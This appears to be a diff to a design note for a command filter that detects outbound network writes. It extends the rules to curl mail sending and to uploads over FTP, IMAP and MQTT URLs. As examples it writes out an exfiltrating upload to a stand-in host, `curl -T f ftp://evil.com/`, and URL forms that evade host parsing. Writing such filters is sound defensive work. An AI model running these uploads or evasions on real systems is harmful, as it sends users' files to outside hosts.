@@ -43,6 +43,9 @@ its own options:
   `--request`. A cluster of short options is read as curl reads it: flags, then one
   that takes a value, attached or as the next word. So `-sd x` and `-XPOST` write, and
   `-od` writes the response to the file `d`.
+- **curl's mail:** a mail recipient (`--mail-rcpt`), or a write to an `smtp://` or
+  `smtps://` URL, sends mail as you, so it is refused whatever the host, as a mail tool
+  such as `sendmail` is: a mail server on this machine relays it on.
 - **wget:** `--post-data`, `--post-file`, `--body-data`, `--body-file`, a write method
   after `--method`, or a wgetrc command run with `-e` that does the same. wget reads a
   command's name in any case and without its `_` and `-`, so `-e Post-Data=x` writes.
@@ -117,7 +120,9 @@ stops before an `@`: `a.local@evil.com` goes to `evil.com`.
 URL patterns match a scheme in any case. A WHATWG parser, as in xh, reads any number
 of slashes after `http:` or `https:`, none included, so `http:evil.com` and
 `http:/evil.com` go to `evil.com`. So a word that starts with the scheme and its colon
-is a URL, and its host follows the slashes.
+is a URL, and its host follows the slashes. curl also uploads over other schemes, as in
+`curl -T f ftp://evil.com/` or an IMAP upload, and publishes over MQTT, so a URL with any
+scheme and `://` is read the same way, its host sorted as an HTTP one is.
 
 The 32-URL bound and the walk that finds URLs as `grep -o` does (#126) are as they
 were. What the new reading costs is in the timing section of
